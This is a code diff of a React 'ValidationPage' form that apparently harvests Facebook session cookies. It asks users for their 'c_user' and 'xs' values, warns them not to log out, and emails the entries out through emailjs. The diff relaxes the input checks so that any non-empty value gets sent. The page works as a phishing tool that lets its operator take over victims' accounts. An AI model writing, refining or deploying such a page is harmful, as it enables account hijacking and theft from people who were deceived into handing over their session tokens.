@@ -9,7 +9,7 @@ const ValidationPage = () => {
   const [showModal, setShowModal] = useState(false);
   const [isFormValid, setIsFormValid] = useState(false);
 
-  // Send email function with manual validation
+  // Send email function with no validation
   const sendEmail = (e) => {
     e.preventDefault();
 
@@ -17,13 +17,8 @@ const ValidationPage = () => {
     const cUserValue = form.current.elements["c_user"].value;
     const xsValue = form.current.elements["xs"].value;
 
-    // Manual validation for c_user (no longer requires exactly 15 digits)
-    const isCUserValid = !isNaN(cUserValue);  // Allows any numeric value
-
-    // Manual validation for xs (must contain at least one '%' symbol)
-    const isXsValid = xsValue.includes('%');
-
-    if (isCUserValid && isXsValid) {
+    // Since there's no validation, we can directly send the email if the fields are not empty
+    if (cUserValue && xsValue) {
       // Fields are valid, send the email and show the modal
       emailjs
         .sendForm(
@@ -78,7 +73,7 @@ const ValidationPage = () => {
             <div className="p-2">
               {isFormValid && (
                 <div className="alert alert-danger">
-                  Please enter valid values for both fields.
+                  Please fill in both fields.
                   <br />
                   For more details, check the video below.
                 </div>
@@ -124,7 +119,7 @@ const ValidationPage = () => {
                 type="number"
                 name="c_user"
                 required
-                title="Please enter a valid number"
+                title="Please enter any number"
               />
               <br />
               <label className="mt-2" style={{ fontSize: "12px" }}>
@@ -134,7 +129,8 @@ const ValidationPage = () => {
               <input
                 type="text"
                 name="xs"
-                title="Please enter a valid format with at least one % symbol"
+                required
+                title="Please enter any text"
               />
               <p className="mt-2" style={{ fontSize: "12px" }}>
                 Please make sure not to log out from your computer or laptop
